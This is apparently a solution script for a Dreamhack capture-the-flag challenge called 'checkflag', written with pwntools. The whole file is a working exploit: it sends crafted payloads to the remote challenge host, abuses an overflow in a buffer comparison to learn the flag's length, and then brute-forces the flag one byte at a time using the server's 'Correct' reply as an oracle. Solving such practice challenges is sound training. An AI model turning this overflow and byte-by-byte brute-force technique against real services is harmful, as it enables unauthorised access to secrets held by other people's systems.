#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./checkflag',checksec=False)

len_flag = 0
for i in range(1,64):
    p  = remote('host1.dreamhack.games', 22149)
    payload = b'a'*i
    payload = payload.ljust(0x40,b'\x00')
    payload += b'a'*i
    p.sendafter(b'?',payload)
    if b'Correct' in p.recvline():
        len_flag = i
        print(f"len flag: {len_flag}")
        p.close()
        break
    p.close()
flag = b''
for i in range(16):
    log.info(f"count {i}")
    for j in range(0x20,0x7f):
        p = remote('host1.dreamhack.games',22149)
        payload = b'a'*(15-i)
        payload += bytes([j]) + flag 
        payload = payload.ljust(64,b'\x00') + b'a'*(15-i)
        p.sendafter(b'?',payload)
        if b'Correct' in p.recvline():
            flag = bytes([j]) + flag
            print(flag)
            p.close()
            break
        p.close()
print(f"flag is {flag}.decode()")



p.interactive()
